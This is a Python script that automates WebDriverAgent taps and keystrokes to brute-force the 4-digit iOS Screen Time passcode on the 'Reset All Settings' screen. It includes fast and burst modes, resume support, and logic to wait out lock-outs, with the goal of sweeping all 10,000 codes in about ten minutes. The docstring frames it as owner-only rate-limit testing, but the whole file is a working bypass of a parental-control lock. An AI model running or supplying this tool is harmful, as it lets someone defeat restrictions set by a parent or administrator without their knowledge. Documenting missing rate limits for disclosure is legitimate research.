#!/usr/bin/env python3
"""
screentime_bruteforce.py — drive WebDriverAgent through the Screen Time
passcode prompt to test whether that prompt is rate-limited.

Context
-------
The "Reset All Settings" flow on iOS asks for, in order:
    1. the device unlock passcode,
    2. the 4-digit Screen Time passcode,
    3. (sometimes) the Apple ID password.

On some iOS versions step (2) has NO attempt limit / back-off, which makes the
4-digit space (10 000 combinations) brute-forceable. This script automates
step (2) on a device YOU OWN to answer two questions:

    * is there a rate-limit on this iOS version? (it measures timing + detects
      lock-out)
    * if not, what is the passcode?

Because reaching this prompt requires the device unlock passcode, this only
works on a device you already control. Use on your own / authorized devices.

Safety
------
On a CORRECT guess the script STOPS immediately and prints the code. It does
NOT tap the final red "Reset All Settings" confirmation — you decide whether to
actually proceed. ("Reset All Settings" clears settings, not your data, but the
decision stays with you.)

How to drive it
---------------
1. Start WebDriverAgent on the iPad and port-forward 8100 (see README.md).
2. On the iPad, navigate manually to:
   Settings -> General -> Transfer or Reset iPad -> Reset -> Reset All Settings
   -> enter the DEVICE passcode -> stop on the "Enter Screen Time Passcode"
   screen (the 4-dot keypad).
3. Run this script. It taps the on-screen digits for each candidate.

    python3 screentime_bruteforce.py            # sequential sweep 0000..9999
    python3 screentime_bruteforce.py --fast     # max throughput (atomic type + 1 read poll)
    python3 screentime_bruteforce.py --resume   # continue from last progress
    python3 screentime_bruteforce.py --benchmark 200   # measure codes/s, project full sweep
    python3 screentime_bruteforce.py --dry-run  # print plan, do not tap

Speed
-----
Each candidate costs at least one "type the code" round-trip plus one "did the
screen react?" read, and the device needs a moment to either advance (correct)
or reset the field (wrong) — that per-submission reaction is the real floor, not
the HTTP latency. --fast strips everything else: it types the 4 digits in a
single /wda/keys call, skips the pre-code delete and per-tap read-back, and
detects a wrong code the instant the field resets (one attribute read per poll)
instead of waiting out a timeout. Use --benchmark to measure the actual codes/s
on your device and see the projected full-sweep time. Candidates run in plain
numeric order, 0000 through 9999.
"""

import argparse
import itertools
import json
import os
import re
import sys
import time

from wda_control import WDA, WDAError

PROGRESS_FILE = "progress.json"

def candidate_codes(start_index=0):
    """Yield (index, code) for 0000..9999 in plain numeric order, from 0000.

    index == int(code), so --resume picks up exactly where it left off.
    """
    for n in range(10000):
        if n >= start_index:
            yield n, f"{n:04d}"


def load_progress():
    if os.path.exists(PROGRESS_FILE):
        try:
            with open(PROGRESS_FILE) as fh:
                return json.load(fh)
        except (OSError, json.JSONDecodeError):
            pass
    return {"next_index": 0, "tried": 0}


def save_progress(index, tried):
    tmp = PROGRESS_FILE + ".tmp"
    with open(tmp, "w") as fh:
        json.dump({"next_index": index, "tried": tried}, fh)
    os.replace(tmp, PROGRESS_FILE)


def tap_digit(wda, digit, digit_xpath):
    """Tap a single keypad digit, trying a few locator strategies."""
    # 1) accessibility id equal to the digit (most common for passcode pads)
    if wda.tap_button(digit, using="accessibility id", strict=False):
        return True
    # 2) configurable xpath template, e.g. //XCUIElementTypeKey[@name='{d}']
    if digit_xpath:
        if wda.tap_button(digit_xpath.format(d=digit), using="xpath", strict=False):
            return True
    # 3) plain name
    if wda.tap_button(digit, using="name", strict=False):
        return True
    raise WDAError(f"could not locate keypad digit {digit!r} "
                   f"(use `wda_control.py source` to find its name/xpath)")


def clear_field(wda, clear_key, taps):
    """Tap the delete key a few times so the field is empty before a code.

    Tapping delete on an already-empty field is a harmless no-op, so this keeps
    every attempt aligned even if a previous tap was dropped on the network.
    """
    for _ in range(taps):
        wda.tap_button(clear_key, using="accessibility id", strict=False)


def enter_code(wda, code, digit_xpath, use_keys):
    """Enter a 4-digit code. By default taps keypad buttons; --use-keys types."""
    if use_keys:
        wda.keys(code)
    else:
        for d in code:
            tap_digit(wda, d, digit_xpath)


# The single passcode TextView; its `value` changes with every registered tap.
FIELD_USING = "predicate string"
FIELD_VALUE = "type == 'XCUIElementTypeTextView'"


def field_value(wda):
    """Raw `value` of the passcode field, or None if it can't be read."""
    try:
        return wda.value_of(FIELD_USING, FIELD_VALUE)
    except WDAError:
        return None


def field_snapshot(wda):
    """Return (element_id, value) for the passcode field, or (None, None).

    Used by the fast path: we grab the field's id once right after submitting a
    code so judge() can re-read just its `value` attribute (one round-trip) to
    spot the wrong-code reset, instead of re-finding the element every poll.
    """
    try:
        eid = wda.find(FIELD_USING, FIELD_VALUE)
    except WDAError:
        return None, None
    if eid is None:
        return None, None
    try:
        return eid, wda.attribute(eid, "value")
    except WDAError:
        return eid, None


def enter_code_verified(wda, code, args):
    """Clear, then enter `code` digit-by-digit, confirming each tap registered.

    Returns (field_eid, full_val): the passcode field's element id and its
    `value` right after the submitting input. judge() uses them to detect the
    wrong-code field-reset with a single attribute read per poll (no manual
    --wrong-value calibration needed). Returns (None, None) when no snapshot was
    taken (e.g. a --wrong-value signal is already configured).

    Why the per-tap verification (slow path): a single tap dropped over the
    iproxy bridge would otherwise submit a short/wrong code, get judged 'wrong',
    and skip that candidate forever. We re-tap a digit whenever the field's
    value did NOT change after the tap. The check is semantics-agnostic — a
    registered tap appends a digit / a masking bullet / increments a count, all
    of which change `value`. The final tap submits the code (a wrong code then
    resets the field, also a change), so we only special-case a dropped FINAL
    tap: field unchanged AND still on prompt.
    """
    if not args.no_clear:
        clear_field(wda, args.clear_key, args.clear_taps)
    # /wda/keys types atomically, and verification is opt-out — take the fast path.
    if args.use_keys or args.no_verify_entry:
        enter_code(wda, code, args.digit_xpath, args.use_keys)
        if args.settle:
            time.sleep(args.settle)
        # Snapshot the field so judge() can spot the wrong-code reset without a
        # hand-calibrated --wrong-value. Skipped when a wrong signal is already
        # configured (judge needs no snapshot then) to save one read per code.
        if not args.wrong_value:
            return field_snapshot(wda)
        return None, None

    prev = field_value(wda)
    last = len(code) - 1
    for i, d in enumerate(code):
        tap_digit(wda, d, args.digit_xpath)
        if i == last:
            break  # the submitting tap — its outcome is judge()'s job
        registered = False
        for _ in range(args.entry_retries + 1):
            cur = field_value(wda)
            # None == field unreadable: can't verify, so don't risk a double-tap.
            if cur is None or cur != prev:
                registered, prev = True, cur
                break
            tap_digit(wda, d, args.digit_xpath)  # dropped -> re-tap this digit
        if not registered:
            prev = field_value(wda)  # gave up verifying; resync the baseline
    if args.settle:
        time.sleep(args.settle)
    # Recover a dropped FINAL tap: field still shows the 3-digit state (unchanged)
    # and we're still on the prompt — a real wrong code would have reset it.
    if still_on_prompt(wda, args.marker_using, args.marker_value):
        cur = field_value(wda)
        if cur is not None and cur == prev:
            tap_digit(wda, code[-1], args.digit_xpath)
            if args.settle:
                time.sleep(args.settle)
    return None, None


def still_on_prompt(wda, marker_using, marker_value):
    """True while we are still on the Screen Time passcode prompt.

    Default marker: the keypad digit '1' is still present. When the correct
    code is accepted, the flow advances and the keypad disappears.
    """
    return wda.find(marker_using, marker_value) is not None


def judge(wda, args, field_eid=None, full_val=None):
    """Poll until a definitive outcome, returning 'success' or 'wrong'.

    Primary, calibration-free signal: SUCCESS the instant the passcode prompt is
    gone — the correct code advanced the screen. A correct code returns
    immediately and is never lost to a slow transition or a too-short timeout.

    Fast wrong-detection (the speed win): a wrong code keeps us on the prompt but
    RESETS the passcode field. Three ways to call 'wrong' before the timeout, in
    order of preference:

      1. --wrong-value: a device-calibrated predicate (set via --diagnose). One
         /element find per poll.
      2. field snapshot (default fast path): we hold the field's element id and
         its just-submitted `value`; the reset changes that value, and a correct
         code makes the element vanish (read errors). One attribute read per poll
         — and it doubles as the success check, so the fast path is ONE
         round-trip per poll.
      3. neither: fall back to "still on the prompt at the timeout = wrong".

    Only the WRONG verdict can wait out the timeout, so judge_timeout stays safe
    against a false 'wrong' on the real code.
    """
    deadline = time.time() + args.judge_timeout
    while time.time() < deadline:
        # Fast single-read path: re-read just the snapshotted field's value.
        if not args.wrong_value and field_eid is not None and full_val is not None:
            try:
                cur = wda.attribute(field_eid, "value")
            except WDAError:
                cur = None  # element id went stale
            if cur is not None and cur != full_val:
                return "wrong"  # field reset in place -> wrong code
            if cur is None:
                # The field id is gone: either the screen is advancing (success)
                # or the field was recreated on a wrong-code reset. Resolve only
                # via the prompt marker, and NEVER call 'wrong' here — so a real
                # success can't lose a race to a lingering stale read.
                if not still_on_prompt(wda, args.marker_using, args.marker_value):
                    return "success"
                field_eid, full_val = field_snapshot(wda)  # re-grab the field
            time.sleep(args.poll)
            continue
        # Reliable primary signal: the prompt disappeared -> code accepted.
        if not still_on_prompt(wda, args.marker_using, args.marker_value):
            return "success"
        # Optional fast wrong-path: trust it only while still on the prompt, and
        # only if it was calibrated via --diagnose (off by default).
        if args.wrong_value and wda.find(args.wrong_using, args.wrong_value) is not None:
            return "wrong"
        time.sleep(args.poll)
    # Timed out: prompt still present -> wrong; gone -> success.
    return "wrong" if still_on_prompt(wda, args.marker_using, args.marker_value) else "success"


def detect_lockout(wda, lockout_marker):
    """Best-effort: return True if a 'try again later' state is visible."""
    if not lockout_marker:
        return False
    try:
        src = wda.source()
    except WDAError:
        return False
    return lockout_marker.lower() in src.lower()


def keypad_locked(wda, sample_digit="1"):
    """True if a keypad digit is present but DISABLED — the lock-out signal.

    iOS greys out the passcode keypad while it throttles attempts, so a disabled
    digit key means we are locked out. Locale-independent (no message text).
    If the keypad is gone entirely we return False (that's success/another
    screen, handled elsewhere — not a lock-out).
    """
    eid = wda.find("accessibility id", sample_digit)
    if eid is None:
        return False
    try:
        return not wda.is_enabled(eid)
    except WDAError:
        return False


def wait_out_lockout(wda, args, index, tried):
    """Block while the keypad is locked, so we never burn codes during a freeze.

    Returns once the keypad is tappable again. Saves progress so an interrupt
    here resumes on the current (untried) code.
    """
    announced = False
    while keypad_locked(wda):
        if not announced:
            print(f"\n[LOCKED OUT] keypad disabled at attempt {tried} — iOS IS "
                  f"rate-limiting this screen. Waiting it out "
                  f"({args.lockout_wait:.0f}s steps); Ctrl+C to stop.")
            announced = True
        save_progress(index, tried)
        time.sleep(args.lockout_wait)
    if announced:
        print("[unlocked] resuming.")


# Words (any locale) that hint at a wrong-attempt / lock-out message in the tree.
_LOCKOUT_HINTS = ["повтор", "попыт", "невер", "отключ", "минут", "позже",
                  "incorrect", "try again", "attempt", "disabled", "later", "minute"]


def diagnose(wda, args):
    """Enter ONE code and report the resulting on-screen state.

    Purpose: read the device's *actual* feedback (field reset, disabled keys,
    error text) so the wrong-code and lock-out signals can be set precisely
    instead of guessed. Entering one full code is safe: if it happens to be
    correct the screen just advances (we stop, we never confirm the erase).
    """
    code = args.diagnose or "0000"
    if not args.no_clear:
        clear_field(wda, args.clear_key, args.clear_taps)
    print(f"entering one test code: {code}")
    enter_code(wda, code, args.digit_xpath, args.use_keys)
    time.sleep(max(args.settle, 1.2))

    src = wda.source()
    on_prompt = "DKScreenTimePasscodeView" in src
    print(f"\nstill on passcode prompt (navbar present): {on_prompt}")
    if not on_prompt:
        print(">>> code ACCEPTED — the screen advanced, so this code was correct.")
        print(">>> stopped here; the erase confirmation is NOT touched.")
        return 0

    # passcode field state — the single TextView; attributes appear in any order
    field = re.search(r'<XCUIElementTypeTextView\b[^>]*>', src)
    if field:
        v = re.search(r'value="([^"]*)"', field.group(0))
        print("passcode field value :", v.group(1) if v else "(no value attribute)")
    else:
        print("passcode field value : (no TextView field found)")

    # are the digit keys still tappable, or disabled (lock-out)?
    keys = re.findall(r'<XCUIElementTypeKey[^>]*\bname="(\d)"[^>]*\benabled="(true|false)"', src)
    disabled = sorted({d for d, en in keys if en == "false"})
    print(f"digit keys           : {len(keys)} found, disabled: {disabled or 'none'}")

    # any text that looks like a wrong/lock-out message
    texts = re.findall(r'(?:value|label)="([^"]{3,})"', src)
    notable = sorted({t for t in texts
                      if any(w in t.lower() for w in _LOCKOUT_HINTS)})
    print("notable text         :", notable or "none")
    print("\nSend this output back and the wrong/lock-out signals will be set "
          "from it (no more guessing).")
    return 0


TOTAL_CODES = 10000          # full 4-digit space
SWEEP_TARGET_S = 600         # "full sweep in 10 minutes" goal


def logw(args, msg):
    """Append one timestamped line to args.log (best-effort; no-op if disabled)."""
    if not getattr(args, "log", ""):
        return
    try:
        with open(args.log, "a") as fh:
            fh.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")
    except OSError:
        pass


def flush_burst(wda, args, batch, tried, t_start):
    """Type one whole batch of codes in a single /wda/keys call, check once.

    No clearing and no settle, by design:
      * a WRONG code auto-resets the field, so the next code is already aligned —
        nothing to delete;
      * a CORRECT code dismisses the keyboard / advances the screen, so either the
        leftover keystrokes raise a WDAError (caught here) or the prompt's nav-bar
        marker is simply gone. Both mean the passcode is in this batch.

    The only round-trip after typing is the marker check — it is the hit signal,
    not a wait (a wrong batch keeps the nav bar present regardless of the
    field-reset animation, so there is nothing to wait for).

    Returns True if the correct code is in this batch (report + stop), else False.
    """
    blob = "".join(c for _, c in batch)
    t0 = time.time()
    try:
        wda.keys(blob)  # ONE round-trip; device auto-submits every 4 digits
    except WDAError:
        # Typing aborted — the correct code advanced the screen and the keyboard
        # went away, so the leftover digits had nowhere to land.
        return _report_burst_hit(args, batch, tried)
    if not still_on_prompt(wda, args.marker_using, args.marker_value):
        return _report_burst_hit(args, batch, tried)
    elapsed = time.time() - t0
    done = tried + len(batch)
    rate = len(batch) / elapsed if elapsed else 0.0
    overall = done / (time.time() - t_start) if time.time() > t_start else 0.0
    print(f"[{done:5d}] {batch[0][1]}..{batch[-1][1]} all wrong "
          f"({elapsed:.2f}s, batch {rate:.1f} c/s, overall {overall:.1f} c/s)",
          end="\r", flush=True)
    logw(args, f"batch {batch[0][1]}..{batch[-1][1]} all wrong "
               f"(n={len(batch)}, {elapsed:.2f}s, batch {rate:.1f} c/s, "
               f"overall {overall:.1f} c/s, total {done})")
    return False


def _report_burst_hit(args, batch, tried):
    codes = [c for _, c in batch]
    print(f"\n*** HIT: the passcode is ONE OF these {len(codes)} codes "
          f"(batch {tried + 1}-{tried + len(codes)}) — the screen advanced. ***")
    print("  " + " ".join(codes))
    print("\nThe erase is NOT confirmed (only digits were typed, never a button). "
          "Navigate back to the passcode prompt and pin the exact code safely:")
    print("  python3 screentime_bruteforce.py --fast --only " + ",".join(codes))
    logw(args, f"HIT: passcode is one of {len(codes)} codes "
               f"(batch {tried + 1}-{tried + len(codes)}): {','.join(codes)}")
    return True


def run_burst(wda, args, start_index, tried, t_start):
    """Burst loop: no per-code wait — type args.burst codes per /wda/keys call."""
    print(f"BURST: {args.burst} codes per /wda/keys call, one screen check per batch.")
    print("On the correct code the screen advances mid-batch (digits spill, harmless); "
          "the winning batch is reported — pin it with --only.")
    if args.burst > 100:
        print(f"WARNING: --burst {args.burst} is large. It does NOT type faster (same "
              f"keystroke rate), only widens the winning batch and the blast radius of a "
              f"single dropped keystroke (no clear to resync). 20-50 recommended.")
    print()
    batch = []
    try:
        for index, code in candidate_codes(start_index):
            if args.max_attempts and tried >= args.max_attempts:
                break
            batch.append((index, code))
            if len(batch) >= args.burst:
                if flush_burst(wda, args, batch, tried, t_start):
                    save_progress(batch[0][0], tried)  # stay before the winning batch
                    return 0
                tried += len(batch)
                save_progress(batch[-1][0] + 1, tried)
                batch = []
        if batch:  # tail
            if flush_burst(wda, args, batch, tried, t_start):
                save_progress(batch[0][0], tried)
                return 0
            tried += len(batch)
            save_progress(batch[-1][0] + 1, tried)
        print("\nexhausted all codes without the screen advancing.")
        report_rate(t_start, tried, args)
    except KeyboardInterrupt:
        print(f"\ninterrupted. tried ~{tried}. rerun with --resume to continue.")
        logw(args, f"interrupted in burst at ~{tried} codes")
        report_rate(t_start, tried, args)
        return 130
    except WDAError as exc:
        print(f"\nerror: {exc}", file=sys.stderr)
        logw(args, f"error in burst: {exc}")
        return 1
    return 0


def report_rate(t_start, tried, args=None):
    """Print the achieved rate and the projected full-sweep time vs the target."""
    elapsed = time.time() - t_start
    if tried <= 0 or elapsed <= 0:
        return
    rate = tried / elapsed
    full = TOTAL_CODES / rate
    verdict = "meets" if full <= SWEEP_TARGET_S else "MISSES"
    line1 = (f"throughput: {rate:.1f} codes/s ({tried} codes in {elapsed:.1f}s, "
             f"{elapsed / tried * 1000:.0f} ms/code).")
    line2 = (f"projected full {TOTAL_CODES}-code sweep: {full:.0f}s = {full / 60:.1f} min "
             f"({verdict} the {SWEEP_TARGET_S // 60}-min target).")
    print("\n" + line1)
    print(line2)
    if args is not None:
        logw(args, line1)
        logw(args, line2)


def main(argv=None):
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--base", default=os.environ.get("WDA_BASE", "http://localhost:8100"),
                   help="WDA base URL (default $WDA_BASE or http://localhost:8100)")
    p.add_argument("--resume", action="store_true",
                   help=f"continue from {PROGRESS_FILE}")
    p.add_argument("--fast", action="store_true",
                   help="maximum-throughput mode: type each code atomically via "
                        "/wda/keys (implies --use-keys), skip the pre-code delete "
                        "(--no-clear) and per-tap read-back (--no-verify-entry), and "
                        "tighten settle/poll/judge-timeout. Relies on the device "
                        "auto-resetting the field on a wrong code (true on this "
                        "device). Cuts per-code work to ~one type + one read poll.")
    p.add_argument("--benchmark", type=int, default=0, metavar="N",
                   help="measure throughput: run --fast for N codes, then report the "
                        "achieved codes/s and the projected full 10000-code sweep "
                        "time. Stops instantly on a correct code like a normal run.")
    p.add_argument("--burst", type=int, default=0, metavar="N",
                   help="NO per-code wait: type N codes back-to-back in a SINGLE "
                        "/wda/keys call (the device auto-submits every 4 digits and "
                        "resets the field on a wrong code), then check the screen ONCE "
                        "per batch. Fastest mode — removes the per-code judge. Trade-off: "
                        "on the correct code the screen ADVANCES mid-batch (leftover "
                        "digits spill harmlessly — only digits are sent, never a button "
                        "tap), so it reports the winning BATCH; pin the exact code with "
                        "--only. Bigger N = faster but a wider winning batch and more "
                        "risk of dropped keystrokes; 20-40 is a sane range.")
    p.add_argument("--only", default="", metavar="CODES",
                   help="test ONLY these comma-separated codes (e.g. 0012,0013,...), "
                        "using the safe per-code path that STOPS on the correct one. "
                        "Use to pin the exact passcode inside a --burst winning batch.")
    p.add_argument("--log", default="screentime_log.txt", metavar="FILE",
                   help="append a timestamped record (run start, each batch/result, "
                        "the found code or winning batch, final rate) to this txt file; "
                        "live \\r status still goes to the terminal. Empty to disable. "
                        "(default: screentime_log.txt)")
    p.add_argument("--dry-run", action="store_true",
                   help="print the plan and the first few codes; do not tap")
    p.add_argument("--diagnose", nargs="?", const="0000", default=None, metavar="CODE",
                   help="enter ONE test code (default 0000) and report the resulting "
                        "screen state, then exit — used to calibrate the wrong/lock-out "
                        "signals from the device's real feedback")
    p.add_argument("--use-keys", action="store_true",
                   help="type digits via /wda/keys instead of tapping the keypad")
    p.add_argument("--digit-xpath", default="//XCUIElementTypeKey[@name='{d}']",
                   help="xpath template for a keypad digit; {d} is the digit")
    p.add_argument("--no-clear", action="store_true",
                   help="do not tap delete before each code (faster, less robust)")
    p.add_argument("--no-verify-entry", action="store_true",
                   help="do not read the field back to confirm each tap landed "
                        "(faster, but a dropped tap silently skips that code)")
    p.add_argument("--entry-retries", type=int, default=2,
                   help="max re-taps for a digit whose tap didn't register")
    p.add_argument("--clear-key", default="delete",
                   help="name/accessibility id of the delete key")
    p.add_argument("--clear-taps", type=int, default=4,
                   help="how many times to tap delete before each code")
    p.add_argument("--marker-using", default="predicate string",
                   help="locator strategy that detects 'still on the prompt'")
    p.add_argument("--marker-value", default="name == 'DKScreenTimePasscodeView'",
                   help="locator value for the 'still on prompt' check "
                        "(default: the Screen Time passcode nav bar)")
    p.add_argument("--settle", type=float, default=None,
                   help="small pause after entering a code before judging starts "
                        "(default 0.1; 0.0 in --fast)")
    p.add_argument("--wrong-using", default="predicate string",
                   help="locator strategy for the wrong-code error signal")
    p.add_argument("--wrong-value", default="",
                   help="OPTIONAL fast wrong-code signal (off by default). Set it "
                        "only after calibrating with --diagnose on THIS device, "
                        "e.g. \"type == 'XCUIElementTypeTextView' AND value "
                        "BEGINSWITH '0'\" if the field resets to '0 entered' on a "
                        "wrong code. When unset, a wrong code is concluded by the "
                        "prompt still being present at --judge-timeout.")
    p.add_argument("--judge-timeout", type=float, default=None,
                   help="max seconds to wait before concluding a code is WRONG; "
                        "a correct code is detected instantly (prompt disappears), "
                        "so a generous value here is safe and only slows wrong codes "
                        "(default 1.5; 0.4 in --fast — fast-wrong detection rarely "
                        "reaches it)")
    p.add_argument("--poll", type=float, default=None,
                   help="how often to poll for the outcome while judging "
                        "(default 0.06; 0.03 in --fast)")
    p.add_argument("--lockout-marker", default="",
                   help="substring in the source that indicates a lock-out "
                        "(e.g. 'Try again'); enables back-off")
    p.add_argument("--lockout-wait", type=float, default=60.0,
                   help="seconds to sleep when a lock-out is detected")
    p.add_argument("--lockout-check-every", type=int, default=10,
                   help="check for a keypad lock-out every N attempts (0 = never)")
    p.add_argument("--max-attempts", type=int, default=0,
                   help="stop after N attempts (0 = no limit)")
    args = p.parse_args(argv)

    # --benchmark N == --fast capped at N codes (unless a stricter cap is given).
    if args.benchmark:
        args.fast = True
        if not args.max_attempts or args.benchmark < args.max_attempts:
            args.max_attempts = args.benchmark
    # --fast turns on the atomic/no-readback combo for maximum throughput.
    if args.fast:
        args.use_keys = True
        args.no_clear = True
        args.no_verify_entry = True
    # --burst types whole batches via /wda/keys; it clears per batch for alignment,
    # so it needs atomic typing but NOT the per-code no_clear/no_verify of --fast.
    if args.burst:
        args.use_keys = True
    # Resolve timing defaults: tighter under --fast, generous otherwise.
    if args.settle is None:
        args.settle = 0.0 if args.fast else 0.1
    if args.poll is None:
        args.poll = 0.03 if args.fast else 0.06
    if args.judge_timeout is None:
        args.judge_timeout = 0.4 if args.fast else 1.5

    progress = load_progress() if args.resume else {"next_index": 0, "tried": 0}
    start_index = progress["next_index"]
    tried = progress["tried"]

    if args.dry_run:
        print("DRY RUN — no taps will be sent.")
        print(f"start index: {start_index}")
        preview = list(itertools.islice(candidate_codes(start_index), 12))
        print("first codes:", ", ".join(c for _, c in preview))
        return 0

    try:
        wda = WDA(base=args.base)
    except WDAError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1

    if args.diagnose is not None:
        try:
            return diagnose(wda, args)
        except WDAError as exc:
            print(f"error: {exc}", file=sys.stderr)
            return 1

    print(f"connected. starting at index {start_index} (already tried {tried}).")
    print("press Ctrl+C to stop; use --resume to continue later.\n")

    mode = (f"burst {args.burst}" if args.burst else "only" if args.only
            else "fast" if args.fast else "normal")
    logw(args, f"==== run start: mode={mode} base={args.base} "
               f"start_index={start_index} tried={tried} ====")

    t_start = time.time()

    if args.burst:
        return run_burst(wda, args, start_index, tried, t_start)

    code_source = candidate_codes(start_index)
    if args.only:
        only = [c.strip() for c in args.only.split(",") if c.strip()]
        code_source = list(enumerate(only))
        print(f"--only: testing {len(only)} codes (safe per-code, stops on the "
              f"correct one); progress.json is NOT updated.\n")

    try:
        for index, code in code_source:
            if args.max_attempts and tried >= args.max_attempts:
                label = "benchmark" if args.benchmark else f"--max-attempts={args.max_attempts}"
                print(f"\nreached {label}; stopping.")
                report_rate(t_start, tried, args)
                break

            # Periodically make sure we are not locked out, so a freeze doesn't
            # make us silently burn (and skip) codes that never get tested.
            if args.lockout_check_every and tried % args.lockout_check_every == 0:
                wait_out_lockout(wda, args, index, tried)

            # --- one guess cycle: get -> enter -> judge -> log -> decide ---
            # 1. get the next candidate passcode (`code`, yielded by code_source)
            # 2. enter it
            t0 = time.time()
            field_eid, full_val = enter_code_verified(wda, code, args)
            tried += 1

            # 3. wait for the device's yes/no verdict
            result = judge(wda, args, field_eid, full_val)
            elapsed = time.time() - t0
            verdict = "да" if result == "success" else "нет"

            # 4. record the passcode and its verdict in the log
            logw(args, f"[{tried}] {code} -> {verdict} ({elapsed:.2f}s)")

            # 5a. yes -> stop and report the passcode
            if result == "success":
                if not args.only:
                    save_progress(index, tried)
                print(f"\n*** SUCCESS: Screen Time passcode = {code} "
                      f"(attempt {tried}, {elapsed:.2f}s) ***")
                print("Stopped on the correct code — NOT confirming the erase. "
                      "The red button is yours.")
                logw(args, f"SUCCESS: passcode = {code} (attempt {tried})")
                return 0

            # 5b. no -> save progress and repeat the cycle
            if not args.only:
                save_progress(index + 1, tried)
            avg = (time.time() - t_start) / max(tried, 1)
            rate = 1.0 / avg if avg > 0 else 0.0
            print(f"[{tried:5d}] {code} wrong  ({elapsed:.2f}s, {rate:.1f} codes/s, "
                  f"avg {avg:.2f}s/try)", end="\r", flush=True)

            if detect_lockout(wda, args.lockout_marker):
                print(f"\n[lockout detected] sleeping {args.lockout_wait:.0f}s — "
                      f"this means the prompt IS rate-limited on this iOS version.")
                time.sleep(args.lockout_wait)
        else:
            print("\nexhausted all 10000 codes without success.")
            report_rate(t_start, tried, args)
    except KeyboardInterrupt:
        print(f"\ninterrupted. tried {tried}. rerun with --resume to continue.")
        report_rate(t_start, tried, args)
        return 130
    except WDAError as exc:
        print(f"\nerror: {exc}", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
